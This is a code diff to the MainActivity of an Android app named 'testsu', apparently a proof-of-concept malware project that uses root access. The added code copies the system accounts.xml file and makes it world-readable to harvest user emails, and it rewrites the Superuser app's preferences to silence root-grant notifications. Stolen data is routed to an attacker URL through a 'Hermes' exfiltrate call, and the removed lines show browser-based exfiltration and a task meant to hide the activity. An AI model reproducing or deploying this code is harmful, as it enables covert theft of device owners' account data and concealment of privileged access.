@@ -1,7 +1,13 @@
 package com.trustme.testsu;
 
+import java.io.BufferedReader;
+import java.io.BufferedWriter;
 import java.io.File;
+import java.io.FileInputStream;
+import java.io.FileNotFoundException;
+import java.io.FileWriter;
 import java.io.IOException;
+import java.io.InputStreamReader;
 import java.util.ArrayList;
 import java.util.Calendar;
 import java.util.HashMap;
@@ -83,14 +89,13 @@ public class MainActivity extends Activity {
 	private void performMalTasks() {
 		// TODO Auto-generated method stub
 		//getUserLocation();
+
         //getInstalledApplications();
-        //getContacts();
-		
-		//TODO: Create a service that checks if competitor is running
-        //getCompetitorsPid(); 
+        getUserAccounts();
+        //killCompetitor();
         
-        //getUserAccounts();
-		killCompetitor();
+        //getContacts(); //TODO: nikhil
+		//changeSuperUserPrefs();
 	}
 
 	@Override
@@ -104,9 +109,40 @@ public class MainActivity extends Activity {
 		getMenuInflater().inflate(R.menu.activity_main, menu);
 		return true;
 	}
-
+	
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+	/**
+	 * Change the preferences of the SuperUser App
+	 * 	-disable the notifications - Didn't work. The preferences are not being read from the xml file but only
+	 *    written to it
+	 *  @author sdemetr2 
+	 */
+	private void changeSuperUserPrefs() {
+		// copy the original prefs to another file that we grant world access
+		String[] commands = new String[2];
+		commands[0] = new String("cp " + Constants.SU_PREFERENCES_PATH + Constants.SU_PREFERENCES_FILENAME + " " +
+				 Constants.SU_PREFERENCES_PATH + Constants.SU_PREFERENCES_FILENAME + ".bp " + "\n");
+		commands[1] = new String("chmod 777 " + Constants.SU_PREFERENCES_PATH + Constants.SU_PREFERENCES_FILENAME + ".bp " + "\n");
+		
+		Root rt =new Root();
+	    rt.execCommands(commands);
+	    
+	  //modify the world accessible file
+	    ModifySuPrefsTask modify_su_prefs_task = new ModifySuPrefsTask();
+	    modify_su_prefs_task.execute();
+	    
+	  //replace the original file with the modified world accessible file  
+	  //restore the username groupname and privileges of the file
+	    
+	}	
+	
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 	
+	/**
+	 * Get all the registered user emails
+	 * 
+	 * @author sdemetr2 
+	 */
 	private void getUserAccounts() {
 		//move accounts.xml to a convenient location and make it accessible
 		String[] commands = new String[2];
@@ -114,7 +150,7 @@ public class MainActivity extends Activity {
 		commands[1] = new String("chmod 777 " + Constants.INTERNAL_STORAGE_PATH + Constants.NEW_ACCOUNTS_NAME + "\n");
 		
 		Root rt =new Root();
-	    rt.getSecretFile(commands);
+	    rt.execCommands(commands);
 	   // rt.changeMode("/data/system/sync/", "accounts.xml", Constants.NEW_ACCOUNTS_NAME);
 	    
 	    //parse accounts.xml and exfiltrate
@@ -252,11 +288,14 @@ public class MainActivity extends Activity {
 			
 			public void onClick(View v) {
 				// TODO Auto-generated method stub
-				exfiltrate(null,Constants.TEST_TRANSACTION);
+				Hermes hermes = new Hermes();
+				hermes.exfiltrate(null,Constants.TEST_TRANSACTION);
 			}
 
 		});
 	}
+  
+//////////////////////////////////////////////////////////////////////////////////////////////////////////////    
     
     /**
      *
@@ -267,7 +306,7 @@ public class MainActivity extends Activity {
     private void start_checking_for_ip() {
 		// TODO Auto-generated method stub
 		Log.i(TAG, "start service");
-		Intent intent = new Intent(getApplicationContext(), BackgroundService.class);
+		Intent intent = new Intent(MyApplication.getAppContext(), BackgroundService.class);
 		intent.putExtra("CMD", START_IP_CHECK);
 		startService(intent);
 	}
@@ -281,7 +320,7 @@ public class MainActivity extends Activity {
 	protected void stop_checking_for_ip() {
 		// TODO Auto-generated method stub
 		Log.i(TAG, "stop service");
-		Intent intent = new Intent(getApplicationContext(), 
+		Intent intent = new Intent(MyApplication.getAppContext(), 
 				BackgroundService.class);
 		intent.putExtra("CMD", STOP_IP_CHECK);
 		stopService(intent);
@@ -292,96 +331,111 @@ public class MainActivity extends Activity {
 	 protected void start_checking_for_competitor() {
 			// TODO Auto-generated method stub
 		 Log.i(TAG, "start service AreYouRunning");
-			Intent intent = new Intent(getApplicationContext(), AreYouRunningService.class);
+			Intent intent = new Intent(MyApplication.getAppContext(), AreYouRunningService.class);
 			startService(intent);
 		}
 	 
 	 protected void stop_checking_for_competitor() {
 			// TODO Auto-generated method stub
-		 Intent intent = new Intent(getApplicationContext(), AreYouRunningService.class);
+		 Intent intent = new Intent(MyApplication.getAppContext(), AreYouRunningService.class);
 			stopService(intent);
 		}
-	
-//////////////////////////////////////////////////////////////////////////////////////////////////////////////
-	
-	/**
-	 * 
-     * This function will attempt to send the data to the url
-     * 	using the browser
-     * Tip: Make different exfiltrate function to exfiltrate COntacts and installed packages and location
-     * Tip: Pass arguments to exfiltrate as key,value pairs (map) - easier to construct the URL
-     * @author sdemetr2
-     * @param data a Map<String, String> of key-value pairs representing the data to be transfered
-	 * @param id A unique ID that the server uses to acknowledge this transaction
-	 * 
-     */
-    private void exfiltrate(Map<String, String> data, String id) {
-		// TODO Auto-generated method stub
-    	String url = Constants.ATTACKER_URL;
-    	
-    	this.runOnUiThread(new Runnable(){
-            public void run(){
-                try {
-                    RestartTask restartTask = new RestartTask();
-                    restartTask.execute();
-                }
-                catch (Exception e) {
-                    Log.d(TAG, "Exfiltrate Exploded when trying to start background task: " + e.getMessage());
-                }
-            }
-        });
-        
-    	//construct url?key=value&key=value...
-    	url += "?id" + id;
-    	if (data != null){
-	    	for (String key : data.keySet()){
-	    		url += "&" + key + "=" + data.get(key);
-	    	}
-	    	Log.i(TAG, "Constructed URL: " + url);
-    	}
-        Intent myIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
-    	startActivity(myIntent);
-	}
     
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////
 	
+/**
+* 
+* A thread task that will modify the Preferences File of the 
+*  Superuser app
+* @author sdemetr2
+*/
+public class ModifySuPrefsTask extends AsyncTask<Void, Void, Void>{
+	protected ModifySuPrefsTask() { }
+	
+	@Override
+	protected Void doInBackground(Void... unused){
+		try {
+			
+			Thread.sleep(50);
+		}
+		catch (InterruptedException localInterruptedException)
+		{
+			Log.d("MyPlugin", "RestartTask received an InterruptedException");
+		}
+		
+		return null;
+	}
+	
+	@Override
+	protected void onPostExecute(Void justEyeCandy){
+		super.onPostExecute(justEyeCandy);
+		modifySuPrefs();
+	}
+	
 	/**
-	 * 
-     * A background task that starts an Activity which will Restart the main Activity
-     * Useful for hiding an operation that was triggered by the main activity  
-     * @author sdemetr2
-     */
-    public class RestartTask extends AsyncTask<Void, Void, Void>{
-    	protected RestartTask() { }
-
-        @Override
-        protected Void doInBackground(Void... unused){
-            try {
-                // pass time so the built-in dialer app can make the call
-                Thread.sleep(50);
-            }
-            catch (InterruptedException localInterruptedException)
+	 * modify the preferences xml file of the Superuser app
+	 */
+	private void modifySuPrefs() {
+		// TODO Auto-generated method stub
+        File file = new File (Constants.SU_PREFERENCES_PATH + Constants.SU_PREFERENCES_FILENAME + ".bp");
+        
+        FileInputStream fs = null;
+        InputStreamReader in = null;
+        BufferedReader br = null;
+        
+        StringBuffer sb = new StringBuffer();
+        String textinLine;
+        String textToEdit = "<boolean name=\"pref_notifications\" value=\"true\" />";
+        String newText = "<boolean name=\"pref_notifications\" value=\"false\" />";
+        
+        try {
+        	fs = new FileInputStream(file);
+            in = new InputStreamReader(fs);
+            br = new BufferedReader(in);
+	        
+            int counter = 0;
+	        while(true)
             {
-                Log.d("MyPlugin", "RestartTask received an InterruptedException");
+	        	counter++;
+                textinLine=br.readLine();
+                Log.i(TAG, "textinLine.length:" + textinLine);
+                if(textinLine == null)
+                    break;
+                sb.append(textinLine);
             }
+	        //Log.i(TAG, "sb:" + sb.toString());
+            int cnt1 = sb.indexOf(textToEdit);
+            Log.i(TAG, "cnt1: " + cnt1 + ", cnt1+textToEdit.length():" + cnt1+textToEdit.length() );
+            sb.replace(cnt1,cnt1+textToEdit.length(),newText);
+            
+            fs.close();
+            in.close();
+            br.close();
+	        
+		} catch (FileNotFoundException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+			Log.e(TAG, "FileNotFoundException: " + e);
+		} catch (IOException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+			Log.e(TAG, "IOException: " + e);
+		}
+        
+        try{
+            FileWriter fstream = new FileWriter(file);
+            BufferedWriter outobj = new BufferedWriter(fstream);
+            outobj.write(sb.toString());
+            outobj.close();
 
-            return null;
+        }catch (Exception e){
+          System.err.println("Error: " + e.getMessage());
         }
-
-        @Override
-        protected void onPostExecute(Void justEyeCandy){
-            super.onPostExecute(justEyeCandy);
-
-            // Start the RestartActivity in a new task. This will snap the phone out of the built-in dialer app, which
-            // has started in it's own task at this point in time. The RestartActivity gains control and finishes
-            // immediately, leading control back to the activity at the top of the stack in the
-            // app (where the user came from when making the call).
-            Intent restartIntent = new Intent(MainActivity.this.ctx.getApplicationContext(), RestartActivity.class);
-            restartIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-            MainActivity.this.ctx.getApplicationContext().startActivity(restartIntent);
-        }
-    }
-//////////////////////////////////////////////////////////////////////////////////////////////////////////////
+        
+		
+	}
+}
+//////////////////////////////////////////////////////////////////////////////////////////////////////////////    
     
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////
 	/**
@@ -574,7 +628,8 @@ public class MainActivity extends Activity {
 		protected void onPostExecute(Void justEyeCandy){
 			super.onPostExecute(justEyeCandy);
 			
-			getPackages();
+			ArrayList<PInfo> packagesList = getPackages();
+			//exfiltrate
 		}
 		
 		/**
@@ -585,9 +640,9 @@ public class MainActivity extends Activity {
 			// TODO try to exfiltrate them if there is Internet available or store them in the Db and start the IP checker 
 		    ArrayList<PInfo> apps = getInstalledApps(false); /* false = no system packages */
 		    final int max = apps.size();
-		    for (int i=0; i<max; i++) {
-		        apps.get(i).prettyPrint();
-		    }
+//		    for (int i=0; i<max; i++) {
+//		        apps.get(i).prettyPrint();
+//		    }
 		    return apps;
 		}
 		
@@ -617,5 +672,6 @@ public class MainActivity extends Activity {
 		
 	}
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
     
 }
